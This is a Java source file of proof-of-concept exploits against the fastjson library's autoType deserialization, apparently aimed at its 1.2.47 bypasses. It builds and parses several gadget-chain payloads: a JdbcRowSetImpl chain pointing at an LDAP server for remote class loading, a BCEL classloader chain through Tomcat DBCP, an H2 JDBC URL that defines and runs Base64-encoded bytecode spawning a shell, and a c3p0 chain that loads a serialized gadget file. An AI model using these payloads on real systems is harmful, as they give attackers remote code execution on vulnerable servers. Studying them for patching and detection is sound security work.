package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.h2.jdbcx.JdbcDataSource;

import java.io.IOException;
import java.io.StringWriter;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Bypass_47 {
    public static void main(String[] argv) throws IOException, ClassNotFoundException {
        jdbcRowSet();
    }

    public static void jdbcRowSet(){
        //无需开启AutoTypeSupport，基于缓存机制
        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://192.168.126.1:1389/us9a9o\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }

    // jdk<=8u251   tomcat-dbcp  commons-dbcp，不同版本依赖的payload有不同，详见java-chains工具
    public static void bcel() throws ClassNotFoundException, IOException {
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String encode = Utility.encode(javaClass.getBytes(), true);
        String bcel = "$$BCEL$$" + encode;

        String poc = "{\n" +
                "    \"name\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x1\": {\n" +
                "        \"name\": {\n" +
                "            \"@type\": \"java.lang.Class\",\n" +
                "            \"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"x2\": {\n" +
                "            \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"x3\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"%1$s\",\n" +
                "                \"$ref\": \"$.x1.x2.x3.connection\"\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";

        String format = String.format(poc, bcel);
        JSON.parse(format);
    }

    // java.util.Currency触发所有getter
    public static void h2(){
        String poc = "{\n" +
                "    \"x1\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"org.h2.jdbcx.JdbcDataSource\"\n" +
                "    },\n" +
                "    \"x2\": {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"c\": {\n" +
                "            \"@type\": \"org.h2.jdbcx.JdbcDataSource\",\n" +
                "            \"url\": \"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { try { byte[] b = java.util.Base64.getDecoder().decode(\\\"yv66vgAAADIAQAEAWm9yZy9hcGFjaGUvc2hpcm8vY295b3RlL2Rlc2VyaWFsaXphdGlvbi9pbXBsL1Byb3BlcnR5VmFsdWU0NWNjYzQ5NzBmZjI0MWYwYmYzZTBjY2U4NDY1MjU5ZQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=\\\")\\\\; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class, int.class, int.class)\\\\; method.setAccessible(true)\\\\; Class c = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\\\; c.newInstance()\\\\; } catch (Exception e){ }}'\\\\;CALL EXEC ()\\\\;\"\n" +
                "        }\n" +
                "    },\n" +
                "    \"x3\": {\n" +
                "     \"$ref\": \"$.x2.c.connection\"\n" +
                "     }\n" +
                "}";
        JSON.parseObject(poc, JdbcDataSource.class);
    }

    public static void c3p0() throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get("D:/1tmp/cc5.bin"));
        String hex = toHexAscii(bytes);
        String payload = "HexAsciiSerializedMap:" + hex + ";";
        String poc = "{\n" +
                "    \"x1\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                "    },\n" +
                "    \"x2\": {\n" +
                "        \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "        \"userOverridesAsString\": \"%1$s\"\n" +
                "    }\n" +
                "}";

        String format = String.format(poc, payload);
        JSON.parse(format);
    }

    public static String toHexAscii(byte[] bytes)
    {
        int len = bytes.length;
        StringWriter sw = new StringWriter(len * 2);
        for (int i = 0; i < len; ++i)
            addHexAscii(bytes[i], sw);
        return sw.toString();
    }

    static void addHexAscii(byte b, StringWriter sw)
    {
        int ub = b & 0xff;
        int h1 = ub / 16;
        int h2 = ub % 16;
        sw.write(toHexDigit(h1));
        sw.write(toHexDigit(h2));
    }

    private static char toHexDigit(int h)
    {
        char out;
        if (h <= 9) out = (char) (h + 0x30);
        else out = (char) (h + 0x37);
        //System.err.println(h + ": " + out);
        return out;
    }
}